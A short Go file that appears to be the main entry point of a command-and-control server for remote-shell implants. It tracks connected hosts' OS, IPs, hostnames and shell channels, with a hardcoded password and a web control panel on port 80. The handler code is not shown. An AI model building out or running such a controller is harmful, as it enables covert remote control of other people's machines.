package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net"
	"time"
)

type S struct {
	uuid   string
	memory string
	OS     string
	ip     string
	intIp string
	hostName string
	ttl    time.Time
	shellInChan chan string
}

var tcpConn bool
var httpConn bool
var serverMap = make(map[net.Conn]*S)
var shellHandle  []net.Conn
var sign = "customize\x00"
var password string
var httpPort string
var serverPort string
var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
var Pass = "PassW0rd!...\x00"
func tlRandStringRunes(n int) string {
	b := make([]rune, n)

	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}
func main() {

	flag.StringVar(&password,"p" ,"bie","web password.default is bie.")
	flag.StringVar(&httpPort,"w",":80","web control port.default is :80")
	flag.StringVar(&serverPort,"b",":81","backend port.default is :81")
	flag.Parse()
	fmt.Println(password,httpPort,serverPort)
	//httpPort = ":80"
	//serverPort = ":81"
	go HTTPService(httpPort)
	go Clock()
	listen(serverPort)
}
